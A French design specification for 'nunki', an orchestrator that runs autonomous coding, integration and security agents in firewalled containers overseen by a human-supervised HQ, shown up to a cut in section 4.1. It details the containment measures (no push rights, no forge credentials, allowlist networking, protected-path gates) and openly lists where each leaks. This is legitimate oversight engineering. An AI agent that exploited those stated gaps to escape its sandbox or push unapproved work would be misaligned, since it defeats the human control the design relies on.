# nunki — spécification

> **Statut : v2, 2026-09-09.** Construite en dialogue entre Arnaud et Claude
> les 8 et 9 septembre, puis passée par une revue indépendante (une session
> sans le contexte du dialogue ; son rapport est au HQ,
> `discussions/revue-spec-2026-09-09.md`). Cette version intègre la revue.
> Rien de ce fichier n'est implémenté.
>
> Chaque décision porte la mention **« Tranché par Arnaud »** et sa date. Deux
> revues indépendantes (rapports au HQ, `discussions/revue-spec-2026-09-09.md`
> et `-bis.md`) ont chacune été intégrées, leurs décisions passées une par une
> avec Arnaud, leurs corrections appliquées ; il ne reste rien à confirmer.
>
> Périmètre : **un orchestrateur de missions par IA, et rien d'autre.** Pas de
> génération de projet, pas de scaffolding.
>
> L'ordre des sections est celui de la décision : le but, qui fait quoi, les
> restrictions, et seulement ensuite le mécanisme. Un lecteur qui s'arrête à la
> section 3 doit pouvoir dire si le système fait ce qu'il faut ; la section 4 ne
> fait que dire comment. La section 7 dit ce que tout ça coûte.

## 1. Le but

`nunki` fait travailler des agents de code **seuls, longtemps et en parallèle**
sur un dépôt, sous la supervision d'un poste de commandement (le HQ) tenu par
un humain et sa session d'assistant, sans que l'humain soit dans la boucle
d'exécution et sans qu'il cesse d'être le point de contrôle.

Il est **agnostique à la stack** : Rust, Python, TypeScript, Go ou autre ne
changent que des fragments déclarés (batterie, caches, domaines, fichiers
verrouillés), jamais le cœur.

Il est **agnostique au harnais** : Claude Code aujourd'hui, OpenCode, Codex ou
un autre demain. Le harnais est un exécutant interchangeable ; rien de ce qui
fait la méthode ne vit dans ses fichiers propres.

Ce qui est conservé de `claude-setup`, et qui justifie l'existence de ce
dépôt : le HQ comme lieu de décision ; une mission autoportante (cadre, journal,
livrable, canal de suivi) qui survit à la perte de contexte ; des portes de
vérification déterministes ; des slots isolés ; un seul geste humain non
délégable, la validation du push, et le merge ; et trois agents aux rôles
distincts — codeur, intégrateur, sécurité.

Ce qui est abandonné, et pourquoi : l'installeur qui copie des fichiers dans
le dépôt cible et passe ensuite sa vie à décider à qui ils appartiennent
(manifeste, checksums, `.new`, fusions dans les fichiers de réglages). Chaque
règle de propriété était un endroit où détruire du travail en silence.

**Ce que `nunki` est, en un mot : un orchestrateur de missions par IA sur un
dépôt existant.** Tranché par Arnaud le 2026-09-08. Ce n'est **pas** un
générateur de projets : `nunki` ne crée pas de dépôt, ne choisit pas de
structure, ne pose pas de squelette applicatif. Un dépôt vide qu'on veut
amorcer est un dépôt existant comme un autre, et l'amorçage est une mission
parmi d'autres, cadrée par un humain.

## 2. Qui fait quoi

Cinq rôles. Chacun a une seule source de vérité, et un rôle n'écrit jamais
dans celle d'un autre.

| rôle | où il tourne | ce qu'il fait | ce qu'il ne fait jamais | source de vérité |
|---|---|---|---|---|
| **l'humain** | sa machine | valide le cadre d'une mission, arbitre ce qui sort du cadre, **valide le push** une fois les trois rôles verts, merge sur la forge | exécuter | — |
| **le HQ** (superviseur) | une session d'assistant interactive, sur la machine de l'humain — ou, à son choix, dans le seul conteneur interactif du système, qui monte alors le socket du moteur : c'est accepté parce qu'aucun agent n'y tourne, et c'est la seule exception à 3.2 | cadre les missions, les surveille, lance leur vérification, tient le journal et le tableau de bord, rejoue les preuves dans le conteneur du slot (`nunki exec`), **pousse la branche après la validation humaine** | coder dans une mission, pousser avant la validation, merger | son journal, `~/.nunki/<projet>/` |
| **l'agent codeur** | le profil **mission** du slot : aucun service externe | exécute la mission par runs, commite ce qu'elle prescrit, tient le journal de mission et le livrable ; écrit les **tests unitaires et d'intégration** (plusieurs unités ensemble, dépendances bouchonnées ou composant local jetable) | pousser, poser une question bloquante, sortir du périmètre | `MISSION.md` pour le cadre, `JOURNAL.md` pour l'état |
| **l'agent intégrateur** | le profil **système** du même slot : pare-feu élargi aux services déclarés, identifiants de test montés, services levés par `nunki` à côté de lui | **connecte le livrable aux infrastructures externes** — bases de données, API tierces, files de messages, services — joue migrations et fixtures, écrit et **lance les tests système** : bout en bout sur services réels, et tests de contrat contre les API tierces ; commite ce câblage et ces tests ; rend `INTEGRATED` ou `BROKEN` | pousser, toucher au code métier au-delà du câblage (défini en 4.4), lever lui-même un conteneur | `MISSION.md` d'intégration, `JOURNAL.md`, les runs système |
| **l'agent sécurité** | le profil **système** du même slot s'il y a des services, sinon le profil mission ; le code monté en lecture seule, un dossier de mission en écriture | attaque le livrable **intégré** : secrets exposés, entrées non validées, dépendances à avis, surface réseau, chemins protégés touchés, fuzz des entrées, et les points d'intégration que l'intégrateur vient d'ouvrir ; rend un rapport et un verdict `CLEAR` ou `FINDINGS` | corriger, commiter, pousser | le livrable intégré, la configuration, les dépendances |

Le codeur voit les services : non. L'intégrateur et la sécurité les voient :
oui, les mêmes, avec les mêmes identifiants de test. **Tranché par Arnaud le
2026-09-09** : la revue avait montré qu'une sécurité « sans service externe »
attaquerait une application qui ne démarre pas, et rendrait `CLEAR` sur un
binaire qui n'a rien fait. On ne pentest pas un système qui n'est pas
branché ; la sécurité hérite du profil système, et son fuzz d'API vise le
livrable qui tourne.

La relecture commit par commit, le périmètre et les preuves — ce que
`claude-setup` confiait à des relecteurs en lecture seule (`commit-reviewer`,
`evaluator`, `mission-closer`) — ne sont pas un rôle : ce sont des
**instruments du HQ**, tenus par les portes de vérification (4.4) et par des
relecteurs que le HQ lance à la demande, sans droits d'écriture.

Deux règles traversent le tableau.

- **Le rapport d'un agent n'est jamais la vérité, le livrable l'est.** Le HQ
  relit le code et rejoue les preuves ; un relecteur peut se tromper de
  scénario tout en ayant raison sur la structure.
- **Un agent ne corrige jamais son propre constat.** Il le rapporte tel quel.
  C'est le HQ qui décide de la suite, et sa suite est la boucle d'itération de
  4.5 — automatique et bornée. Les deux ne se contredisent pas : l'agent
  rapporte, le HQ itère.

**Qui appelle qui, et quand : la forme de la mission est déclarée au
cadrage.** Tranché par Arnaud le 2026-09-08 (l'ordre, et la sécurité
systématique) et précisé le 2026-09-09 (ce que « systématique » veut dire,
et quand un rôle ne s'applique pas). Le HQ enchaîne les rôles toujours dans
le même ordre, mais **une mission qui n'a pas de services n'appelle pas
l'intégrateur, et une mission sans surface exposée n'appelle pas l'agent
sécurité** : les forcer donnerait un `INTEGRATED` ou un `CLEAR` qui n'a rien
vérifié, le vert creux que ce projet refuse. La sécurité reste systématique
sous sa forme **mécanique** — audit des dépendances, scan de secrets, analyse
statique par stack — jouée comme portes du HQ sur chaque mission, sans agent.

L'en-tête de `MISSION.md`, validé par l'humain avant le lancement, déclare :

| champ | valeurs | ce qui en découle |
|---|---|---|
| `integration` | `none` (avec la raison en une ligne), ou la liste des services | avec `none`, pas de mission d'intégration ; sinon le profil système et l'intégrateur |
| `security` | `gates` ou `agent` | `gates` : les portes mécaniques seulement ; `agent` : en plus, la mission de sécurité — dans le profil système s'il y a des services, sinon dans le profil mission, sur le livrable seul |

`security: agent` s'impose dès que la mission a des services, une surface
exposée (HTTP, fichier importé, message reçu), de l'authentification, de la
cryptographie, ou un parseur d'entrée non fiable. `nunki.yaml` nomme des
**chemins qui interdisent de sous-déclarer** : un commit sous `migrations/`,
`api/`, `auth/` — ce que le projet liste — rend rouge, à la porte de
périmètre, une mission déclarée `integration: none` ou `security: gates`,
avec le message qui dit pourquoi. Le HQ propose la forme, l'humain la valide,
la liste empêche la facilité.

Trois formes en pratique : **code seul** (codeur, portes dont la sécurité
mécanique) ; **code plus agent sécurité** (idem, puis la sécurité sur le
livrable, sans services) ; **code plus intégration plus sécurité** (le flux
complet). Le fuzz de bibliothèque et les invariants ne dépendent pas de la
forme : prescrits au cadrage, ils sont joués par le codeur sur toute fonction
qui prend une entrée, domaine pur compris — c'est là qu'ils rendent le plus.
Le flux complet et les règles d'itération sont en 4.5.

**L'intégrateur et la sécurité travaillent en missions**, comme le codeur :
un dossier, un `MISSION.md`, un journal, un verdict. L'intégrateur produit du
code (câblage, configuration, tests système) et commite, donc il a besoin de
tout ce qu'une mission donne — branche, runs, reprise à froid. La sécurité ne
commite pas mais laisse un rapport qui doit être rejouable, et un journal de
mission est la forme la plus simple de cette trace.

**L'intégrateur travaille sur la branche du codeur.** Tranché par Arnaud le
2026-09-08. La pull request porte le code et son intégration ensemble, et
c'est l'ensemble qui est relu, poussé et mergé.

**Deux niveaux de test, deux profils.** Tranché par Arnaud le 2026-09-08, avec
les mots de l'échelle classique pour qu'un agent les comprenne du premier coup.

| niveau | ce qu'il vérifie | l'extérieur | qui | où |
|---|---|---|---|---|
| **unitaire + intégration** | une unité seule ; plusieurs unités ensemble (service et dépôt de données, handler et routeur) | bouchonné, ou un composant local jetable — un **processus dans l'image** (SQLite, un PostgreSQL embarqué, un Redis local), déclaré par le Dockerfile de stack, jamais un conteneur levé par le test | le codeur | le profil mission, sans réseau vers les services |
| **système** (bout en bout, et contrat contre les API tierces) | l'application assemblée, branchée sur ses **vraies** dépendances | réel, dans un environnement de test | l'intégrateur | le profil système, avec la liste blanche et les identifiants de test que la mission déclare |

Un test qui bouchonne l'extérieur est un test d'intégration, quel que soit
son nom, et il est au codeur. Un mock dans un test système n'est admis que
quand le service réel est inaccessible, et le journal dit lequel et pourquoi.

**Où vivent les services externes** du profil système : trois cas, déclarés
dans le bloc structuré du `MISSION.md` d'intégration (4.1), et c'est la
déclaration qui décide de la liste blanche réseau et des identifiants montés.
**Seul `nunki` lève des conteneurs**, depuis l'hôte ; l'intégrateur rejoint ce
qui est là. La revue a montré que « lancés par lui » imposait le socket
Docker dans le conteneur, c'est-à-dire root sur la machine.

| les services sont | l'intégrateur | réseau | identifiants |
|---|---|---|---|
| **en Docker**, levés par `nunki` à côté de l'agent (le fichier de services du projet), ou par l'humain sur un réseau nommé | les rejoint, joue migrations et fixtures | le réseau nommé du profil, rien d'autre | ceux du fichier de services, jetables |
| **en Kubernetes** | les atteint par un accès dédié au cluster de test | les adresses du cluster déclarées | un compte de service de test, portée minimale |
| **hors de la machine** — une vraie API, un vrai fournisseur | les appelle pour de vrai | les domaines déclarés, un par un | un identifiant de **palier de test** du fournisseur ; s'il n'en a pas, c'est un arbitrage humain écrit dans `MISSION.md`, et 3.2 dit ce que ça expose |
| **inaccessibles** | pose un mock, le nomme au journal avec la raison | — | — |

**Fuzz, invariants, mutants : trois rôles, pas quatre.** Tranché par Arnaud
le 2026-09-08. Trois techniques, trois natures, chacune chez celui qui a déjà
le bon point de vue et la bonne indépendance : le HQ juge les tests du codeur
sans les avoir écrits, la sécurité attaque un code qu'elle n'a pas écrit, le
codeur prouve des propriétés qu'il n'a pas choisies.

- Les **invariants** (tests par propriétés) décrivent le contrat du code ; ils
  s'écrivent avec lui. Ils sont au **codeur**, prescrits comme preuves dans
  `MISSION.md` (« une preuve incapable d'échouer ne prouve rien »).
- Le **fuzzing** a deux formes dans la pratique, et elles ne vont pas au même
  rôle. Le fuzz **de bibliothèque** (cargo-fuzz, libFuzzer, le fuzz natif de
  Go) vise des fonctions isolées — parseurs, décodeurs — et se joue sans
  service, en campagne courte : il est au **codeur**, dans son commit stage.
  Le fuzz **d'API ou de protocole** vise un système qui tourne ; c'est un outil
  de pentest, il est à l'agent **sécurité**, sur le livrable intégré — et
  **jamais contre un fournisseur tiers réel**, dont les conditions
  d'utilisation l'interdisent en général : le fuzz vise le livrable, pas ce
  qu'il appelle.
- La **mutation** ne teste pas le code, elle teste les **tests**. C'est une
  **porte du HQ** (4.4, porte 7), jouée sur les fichiers touchés avant de
  lancer l'intégrateur ; un mutant survivant revient au codeur avec ses trois
  issues possibles (tué par un test nommé, démontré équivalent en une phrase,
  reconnu comme bug et figé dans un test rouge). Le HQ décide et lit ; la
  campagne **s'exécute dans le conteneur du slot**, où sont la toolchain, le
  cache et l'isolation — jamais sur la machine de l'humain, qui n'a pas à
  savoir compiler la stack.

Ce qui vaut pour la mutation vaut pour le fuzz : l'agent qui a le bon point de
vue décide, la charge tourne dans un conteneur autonome.

**Le pipeline, dans l'ordre, inspiré des cadres écrits — et là où il s'en
écarte.** Tranché par Arnaud le 2026-09-09 ; les attributions ont été
vérifiées sur les textes intégraux par la seconde revue, et corrigées. Les
niveaux de test sont ceux d'ISTQB v4 et d'ISO/IEC/IEEE 29119, fusionnés deux
par deux (composant et intégration de composants ; intégration de systèmes
et système), et le mot « acceptation » du tableau est celui de Humble et
Farley, pas le niveau ISTQB du même nom, qui est humain. L'ordre des étapes
est celui du pipeline de livraison continue de Humble et Farley — commit
stage, acceptation automatisée, release — avec **un écart assumé** : leur
étape d'acceptation bouchonne les systèmes tiers, et `nunki` y branche les
services réels et les API tierces, parce que c'est ce que l'intégrateur est
fait pour vérifier. La place de la sécurité mécanique au commit stage suit
NIST SSDF (PW.8) et OWASP SAMM, qui demandent des tests de sécurité
automatisés tout au long du pipeline ; l'agent sécurité sur le livrable
intégré est un choix de `nunki`, que ces cadres n'imposent pas. La mutation à la
revue, sur les lignes changées, vient de Google (Petrović et Ivanković,
2018), **mais Google n'en fait ni une porte ni un score** : les survivants y
sont des constats présentés au relecteur, et c'est cette forme que la porte
7 reprend, sans seuil.

| étape | qui | contenu | pourquoi là |
|---|---|---|---|
| **commit stage** | le codeur | code ; tests unitaires et d'intégration étroite ; tests par propriétés prescrits ; lint ; analyse statique et audit de dépendances par stack ; fuzz de bibliothèque en campagne courte | tout ce qui tourne sans service, en minutes. **Ce qui parle à un service extérieur est bouchonné, jamais ignoré** — la ligne « unitaire + intégration » ci-dessous le dit depuis le premier jour, et depuis le 2026-09-16 le **prompt du codeur** le dit aussi. Il écrit contre une couture à lui — un trait, une fonction, une interface — et prouve tout ce qui entoure l'appel : la requête construite, les lignes converties, ce que veut dire une réponse vide. L'appel lui-même est à l'intégrateur, contre le service. Un `#[ignore]` est au test système de l'intégrateur et à rien d'autre. Mesuré sur `notes-2` : rien ne disait la règle à l'agent, il a écrit un store PostgreSQL sans couture, la campagne de mutation a rendu **cinq survivants que personne dans son conteneur ne pouvait tuer**, et la porte 7 a mangé ses trois tentatives sur un triage imprenable. Une porte qui exige ce que rien n'énonce note l'agent sur un secret |
| **mutation** sur les fichiers touchés | porte du HQ | campagne dans le conteneur du slot, chaque survivant trié par le codeur | ne dépend que du code et des tests unitaires ; jouée plus tard, elle renverrait au codeur après avoir payé l'intégration et la sécurité pour rien |
| **acceptation** | l'intégrateur | tests système de bout en bout sur services réels ; tests de contrat contre les API tierces ; cas d'erreur d'intégration écrits à la main (connexion refusée, 500, délai) | l'étape d'acceptation automatisée, sur un environnement proche de la production |
| **sécurité dynamique** | la sécurité | analyse dynamique, fuzz d'API, pentest, sur le livrable intégré | les cadres la placent toujours sur un système déployé |
| **release** | l'humain | validation, push, merge | le seul geste non délégable |

Chaque étape ne se lance que si la précédente est verte, et plus on avance,
plus c'est lent et cher — c'est la raison de l'ordre, pas une préférence.

**Ce que l'intégrateur écrit, et pourquoi il commite.** Tranché par Arnaud le
2026-09-09. Dans l'étape d'acceptation, quelqu'un doit écrire les tests
système, et le codeur ne le peut pas sérieusement : il n'a pas les services
pour les faire tourner, il les écrirait à l'aveugle. L'intégrateur écrit donc
les tests de bout en bout et de contrat, la configuration qui pointe vers
les services de test, les jeux de données et fixtures, l'ordre de jeu des
migrations — c'est ce que la spec appelle le **câblage**, et la porte 4 en
tient la liste. Il commite parce que ces fichiers font partie du livrable :
sans eux dans la branche, la CI ne rejoue pas les tests système et la pull
request ne porte que la moitié du travail.

Le quatrième rôle reste une option, avec un critère mesurable pour l'ouvrir :
si la sécurité ou l'intégrateur trouvent régulièrement des défauts que des
tests unitaires auraient dû attraper, ou si le taux de mutants survivants
reste haut malgré la porte, c'est le signal qu'il faut un adversaire dédié.
Sans ce signal, la répartition suffit.

## 3. Les restrictions

Elles sont ce qui rend l'autonomie acceptable. Elles se lisent comme des
invariants : si l'un tombe, le système n'est plus sûr, quel que soit le reste.

### 3.1 Ce qu'un agent ne peut jamais faire

1. **Pousser.** Le push n'a lieu qu'après validation humaine, et le merge est
   humain. Tout le reste peut être autonome parce que ceux-là ne le sont pas.
2. **Écrire sur une branche protégée.** `main`, `dev`, et ce que le dépôt
   déclare.
3. **Lire ou écrire un secret de production.** Fichiers d'environnement,
   clés, certificats : aucun n'est présent dans un conteneur d'agent. Ce
   qu'un agent voit, ce sont des **identifiants de test**, et 3.2 dit
   honnêtement ce que ça vaut.
4. **Éditer un chemin protégé** déclaré par le projet : CI, fichiers vendorés,
   témoins de test, fichiers déjà présents sur la base sous un dossier de
   migrations. Créer un fichier neuf dans ces zones peut rester libre
   (« réécrire est l'accident, créer est le travail »).
5. **Atteindre le dépôt principal.** Un agent ne travaille que dans son slot ;
   ses commits n'en sortent que quand le HQ vient les chercher.
6. **Sortir du réseau autorisé.** Liste blanche par rôle, par stack et par
   mission, **vide par défaut**, tout le reste refusé et journalisé.
7. **Poser une question bloquante.** Une décision imprévue se prend dans le
   sens le plus conservateur, se consigne comme `ARBITRAGE-PROVISOIRE`, et se
   présente dans le journal à la fin du run.

### 3.2 Comment ces restrictions sont tenues — la règle d'agnosticité

**Une restriction ne repose jamais sur le harnais.** Les trois harnais visés
ont aujourd'hui un mécanisme de garde — hooks pour Claude Code, hooks pour
Codex depuis sa version 0.117, plugins pour OpenCode — mais aucun n'a la
même forme, aucun n'est garanti sur le suivant, et un harnais que `nunki`
n'a pas encore rencontré n'en a peut-être pas. Ce qui fait respecter la
section 3.1 doit exister quel que soit l'exécutant :

| restriction | tenue par | ce que ça ne tient pas, dit honnêtement |
|---|---|---|
| pousser, atteindre le dépôt principal | le slot : un clone dont l'`origin` est un chemin hôte inexistant dans le conteneur, cloné **sans liens durs** (`--no-hardlinks`, tranché par Arnaud le 2026-09-09 : la revue a montré qu'un clone local à liens durs partage ses objets `.git` avec le dépôt principal, et qu'une écriture brute dans le conteneur les corrompt) ; **aucun credential de forge** dans un conteneur, et **aucun domaine de forge** dans la liste blanche du codeur | un identifiant de forge qui arriverait par une autre voie — un fichier oublié dans le dépôt, une API tierce à intégrer qui *est* une forge — donne à l'agent le droit de pousser n'importe où : ces cas sont un arbitrage humain écrit, jamais un défaut |
| branche protégée | la forge (branches protégées) et la CI ; la porte 2 à chaque run ; la session HQ ne pousse que ce que les portes ont vu | localement, rien n'empêche un agent de commiter sur `main` dans son clone ; la porte 2 le voit, et la forge refuse le push. `nunki check` **vérifie la protection côté forge** par son API quand un credential de forge est présent sur l'hôte, et dit qu'il ne l'a pas vérifiée sinon ; une branche que la forge dit non protégée est rouge. **Sauf si `nunki.yaml` déclare `forge_protection: by_hand`** (tranché par Arnaud le 2026-09-10) : la forge ne peut pas tenir la règle et l'humain la tient lui-même ; `nunki check` ne demande alors rien à la forge et nomme chaque branche « tenue à la main », jamais verte — `nunki` ne voit pas un humain tenir une règle — ni rouge, car un rouge qu'on ne peut pas corriger apprend à ignorer le rouge. Ce que la forge aurait arrêté et que plus rien n'arrête alors : une session sur l'hôte qui tient les credentials git de l'humain ; un agent en conteneur n'a de toute façon ni credential ni domaine de forge (ligne précédente). Mesuré le 2026-09-10 : sur un dépôt privé de l'offre gratuite de GitHub, la protection ne peut être ni posée ni lue (403 « Upgrade to GitHub Pro ») — c'est le cas de `nunki` lui-même, dont `main` et `dev` ne sont pas protégées et dont le `nunki.yaml` déclare `by_hand` ; le champ `protected` de la branche reste lisible, et c'est lui que `nunki check` lit. Un 404 n'est lu comme « branche absente » que si GitHub répond « Branch not found » : le même code répond à un jeton qui ne voit pas le dépôt, et celui-là est « non vérifié », jamais vert ni rouge |
| secrets | rien n'est monté dans un profil mission ; dans un profil système, seuls des fichiers d'identifiants **nommés par la mission** et **rangés dans un dossier réservé aux identifiants de test** (4.1) sont montables, en lecture seule ; un utilisateur sans droits dans le conteneur | **l'agent lit ce que l'application lit** : même utilisateur, même processus. Un identifiant de test monté est visible de l'agent, et le jeton du harnais est dans son environnement. C'est assumé (tranché par Arnaud le 2026-09-09) : la garantie ne porte pas sur « l'agent ne lit pas », qu'aucun mécanisme agnostique ne tient, mais sur « rien de production n'entre dans un conteneur », que le dossier réservé rend mécanique ; un hook de harnais peut refuser la lecture plus tôt, en confort |
| chemins protégés | la porte de périmètre, **par commit et à la fin de chaque run** (4.4), sur le diff base..HEAD ; la relecture du HQ | entre deux runs, un commit interdit existe déjà dans le clone ; il est refusé au run suivant, pas à l'écriture. Un hook de harnais peut refuser plus tôt (confort, 4.3) |
| réseau | le **pare-feu du conteneur** (4.1 bis) : un **sidecar** qui possède l'espace réseau et détient seul les capacités, l'agent qui le rejoint sans aucune ; règles non posées = agent qui ne démarre pas ; le port 53 détourné vers un résolveur **filtrant** qui ne relaie jamais ; aucune plage privée ouverte ; liste blanche par rôle | rien ici ne protège du contenu qu'un domaine autorisé sert. Les adresses suivent les réponses DNS, donc un CDN qui bouge reste joignable ; `nunki check` sonde de l'intérieur |
| question bloquante | le mode sans interface (4.3) : ce qui aurait demandé est refusé ; le contrat de run et le journal | — |

Un hook, un plugin ou un réglage de harnais peut **doubler** une de ces lignes
pour refuser plus tôt et plus lisiblement. C'est un confort par harnais,
livré comme un adaptateur, jamais la garde.

Corollaire, hérité et vérifié : **en autonome, refuser est sûr et demander est
dangereux.** Un refus est lu par l'agent comme une erreur d'outil et il
enchaîne ; une question attend quelqu'un qui n'est pas là.

Ce corollaire porte sur la **question**, pas sur le refus systématique. Ce
qui rend une question impossible est `--permission-prompts none`, passé quel
que soit le mode ; ce que le mode choisit, c'est qui décide à la place de
l'humain. Le projet le déclare (`permission_mode:` dans `nunki.yaml`, `auto` par
défaut depuis le 2026-09-12 — voir le tableau des harnais en 4.3), parce que
tout refuser est aussi une manière de finir un run sans rien avoir produit.

### 3.3 Ce que `nunki` ne fait jamais dans un dépôt

1. Il n'écrit pas dans les fichiers de réglages d'un harnais (`settings.json`
   et consorts). Il les lit s'il le faut. Ce qu'un adaptateur doit passer au
   harnais, il le passe **à l'invocation** (Claude Code accepte ses réglages
   en argument de `-p`), jamais en écrivant dans le slot.
2. Il ne supprime jamais un fichier qu'il n'a pas créé — et un slot, qu'il a
   créé, n'est pas supprimé ni remis à zéro tant qu'il porte des commits non
   rapatriés : `nunki slot rm` et `reset` refusent, et nomment la branche.
3. Il n'écrase jamais un fichier qu'un humain est censé éditer. S'il a une
   version nouvelle à proposer, il la dépose à côté.
4. Il ne décide pas du `.gitignore` du projet. Il peut poser un
   `.gitattributes` **absent** pour forcer LF (4.2 bis), et le dépose à côté
   s'il en existe un.
5. Il ne commite jamais, et ne pousse que par `nunki push`, sur l'ordre
   explicite de l'humain.

### 3.4 Ce qui ne doit pas entrer dans le commun

Pour que le socle reste commun à des gens qui travaillent différemment :
pas de commit automatique, pas de rituel de session obligatoire, pas de porte
propre à un type de projet, et pas d'écriture hors des quatre lieux qui sont
au système — le dépôt cible (où ne vont que `AGENTS.md`, son import et un
`.gitattributes` absent), le home du projet (`~/.nunki/<projet>/` : sa
configuration, son HQ, ses fragments de stack), les slots à côté du dépôt, et
les volumes nommés du moteur de conteneurs.

## 4. Le mécanisme

Tout ce qui précède se tient avec trois couches. Chacune a une frontière
nette, et seule la troisième connaît le harnais.

### 4.1 Le socle portable — des fichiers

Ce que tout harnais lit ou que `nunki` lit lui-même. Du Markdown, du shell, du
YAML, du JSON, du git. Rien d'autre.

| élément | forme | lu par |
|---|---|---|
| les règles du lieu | `AGENTS.md` à la racine (et par zone) ; `CLAUDE.md` n'est qu'un import (`@AGENTS.md`) ou un lien vers lui, les deux documentés par Claude Code. Un `CLAUDE.md` existant n'est pas écrasé (3.3) : `nunki init` dépose l'import à côté, le résumé le dit, et **`nunki check` est rouge** tant que ce `CLAUDE.md` n'importe pas `AGENTS.md` — sinon les règles ne seraient jamais lues par ce harnais et `mission start` partirait sans elles. L'adaptateur peut, en attendant, passer `AGENTS.md` par `--append-system-prompt-file` | tous les harnais qui le supportent, Claude Code via import ou lien |
| les compétences | `SKILL.md`, standard ouvert (agentskills.io) adopté par OpenCode, Codex, Gemini CLI, Cursor, Copilot et d'autres — vérifié le 2026-09-09 ; il peut porter des choses essentielles | les harnais |
| la mission | un dossier **au HQ, hors de l'arbre git** (voir les montages) : `MISSION.md`, `FOLLOWUP_HQ.md` et `MUTANTS.json` (à l'humain et au HQ, lecture seule pour l'agent), `JOURNAL.md`, `PR.md`, `VERDICT.json`, `MUTANTS.triage.json` (à l'agent) — la même forme pour les trois rôles | l'agent qui la porte, le HQ |
| le bloc structuré de `MISSION.md` | un en-tête YAML que `nunki` lit, valide et **fige dans son état à la validation humaine** : forme (`integration`, `security`), rôle, branche, base, **la liste des lots** (un identifiant et un titre chacun — c'est elle qui donne « un run par lot » et qui fait refuser un `VERDICT.json` écrit avant que le dernier lot ait son entrée « fini » dans le journal), borne de volets, tentatives par lot, délais, script de lancement, **modèle** (`model:`, quand le harnais en prend un ; `nunki.yaml` le déclare pour le projet et l'en-tête le raffine), et pour une mission d'intégration les **services** (réseau nommé, adresses, domaines, et `shared: true` pour un fournisseur réel, que les autres missions attendent — 7) et les **fichiers d'identifiants** montés. La prose du gabarit vient après, pour l'agent. L'agent ne peut pas l'écrire, et `nunki` ne le relit pas en cours de mission | `nunki`, puis l'agent |
| le verdict | `VERDICT.json` dans le dossier de mission : `{ role, verdict, head, date, report }`, écrit par l'agent à la fin de son dernier run ; `nunki` le refuse si `head` n'est pas le `HEAD` réel de la branche | `nunki` |
| le contrat de run | un run par lot (4.3) : ce qu'un run doit avoir produit avant de sortir — le lot commité et prouvé ou l'échec dit, arbre commitable, bloc `ÉTAT DE REPRISE` en tête du journal (écrit aussi toutes les 45 minutes en cours de run), et pour le dernier lot le verdict. Pour le codeur, ce bloc se termine par la ligne `Lot: <lot> — done`, ou `Lot: <lot> — failed: <raison>` : la seule que `nunki` lise pour savoir le lot fini (tranché par Arnaud le 2026-09-11) | l'agent, par `MISSION.md` ; `nunki`, à la sortie et aux checkpoints |
| les chemins protégés | une liste déclarative par projet, **deux modes** : refuser, refuser seulement si le fichier existe déjà sur la base. Le mode « demander » a disparu : rien ne peut demander en autonome | la porte de périmètre, et l'adaptateur harnais s'il double |
| la batterie | un script par projet, cousu depuis un fragment par stack | la porte « batterie », la CI |
| la configuration du projet | `nunki.yaml` dans le home du projet (`~/.nunki/<id>/nunki.yaml`), **hors du dépôt**, et qui nomme le dépôt auquel il appartient (`root:`) — le home porte l'identifiant de la session, jamais le nom du dossier, et `root:` reste la source de vérité si le registre et le home se contredisent : harnais, stacks, branches protégées, chemins protégés, liste blanche par stack, borne de volets, seuil de mutants, délais, dossier des identifiants de test, script de lancement (`run:`), modèle du harnais (`model:` — aucun nom n'est vérifié contre une liste : `nunki` connaît des harnais, pas des modèles, et c'est le harnais qui refuse ce qu'il ne connaît pas), mode de permission (`permission_mode:`, `auto` par défaut — voir le tableau des harnais en 4.3), fichier de services du projet (`services_file:`) et qui tient les branches protégées côté forge (`forge_protection:`, `forge` par défaut ou `by_hand`). `MISSION.md` prime sur lui pour ce qu'il redéclare | `nunki` |
| le conteneur | un **Dockerfile** par stack (les anciennes « features » deviennent des étapes, l'image pré-crée les points de montage avec l'uid de l'hôte) et un fichier **Compose par profil, généré par `nunki`** à chaque lancement — voir 4.2. **Tous les conteneurs d'agent sont autonomes** : derrière un pare-feu en liste blanche, sans supervision humaine dedans, arrêtables par `nunki`. Deux variantes d'un même profil autonome — **mission** (codeur : aucun service externe) et **système** (intégrateur et sécurité : pare-feu élargi aux services déclarés, identifiants de test montés, services à côté). Un profil **interactif** n'existe que pour un seul usage possible : héberger le **HQ** lui-même si l'humain choisit de le faire tourner en conteneur plutôt que sur sa machine ; un `devcontainer.json` de quelques lignes est la **vue IDE** de ce profil, et rien de plus. Aucun agent ne tourne jamais en interactif | le moteur de conteneurs, par sa commande Compose |
| le HQ du projet | `~/.nunki/<id>/hq/` : journal, tableau de bord, file de remontées, discussions, **et l'état de `nunki`** (4.2). Jamais monté dans un conteneur, hormis le dossier de chaque mission | le superviseur, `nunki` |
| le registre des sessions | `~/.nunki/sessions.json` : une ligne par projet, **un identifiant et le chemin de son dépôt**. Tranché par Arnaud le 2026-09-16, parce qu'un home nommé d'après le dossier du dépôt refusait le second projet appelé `api` au lieu de le servir. C'est un **index**, jamais l'autorité : chaque home nomme son dépôt (`root:`), donc un registre perdu se reconstruit depuis les homes, et un registre qui contredit un home est refusé plutôt que suivi. `nunki init` ouvre une session, `nunki sessions` les liste, et `nunki adopt <id>` réinscrit un dépôt déplacé — en refusant tant que l'ancien chemin abrite encore un dépôt, qui est le projet de quelqu'un | `nunki` |

**Les montages, par profil.** La revue a montré que « où vit le dossier de
mission » décidait de tout le reste : l'agent y écrit son journal pendant que
le HQ y écrit le suivi, la sécurité doit y écrire alors que le code est en
lecture seule, et la porte « arbre propre » ne doit pas le voir.

| profil | l'arbre du slot | le dossier de mission | identifiants | services |
|---|---|---|---|---|
| mission (codeur) | lecture-écriture | **hors de l'arbre**, au HQ : `~/.nunki/<projet>/hq/missions/<id>/`, monté dans le conteneur — **quatre fichiers en écriture** (`JOURNAL.md`, `PR.md`, `VERDICT.json`, `MUTANTS.triage.json`), le reste en lecture seule | aucun | aucun |
| système (intégrateur) | lecture-écriture | idem | les fichiers nommés par la mission, en lecture seule, depuis le dossier réservé | ceux de la mission, à côté |
| système (sécurité) | **lecture seule**, plus les répertoires d'écriture déclarés par la stack en volumes | idem | idem | idem, jamais arrêtés depuis le profil précédent |
| interactif (HQ) | lecture-écriture | tout `~/.nunki/<projet>/` | ce que l'humain décide | ce que l'humain décide |

**Le dossier de mission vit au HQ, pas dans le slot.** Tranché par Arnaud le
2026-09-09. `claude-setup` le rangeait dans le slot, sous `.<prenom>/missions/`,
protégé de git par une exclusion locale ; ici il est sous
`~/.nunki/<projet>/hq/missions/<id>/` et monté dans le conteneur. C'est un
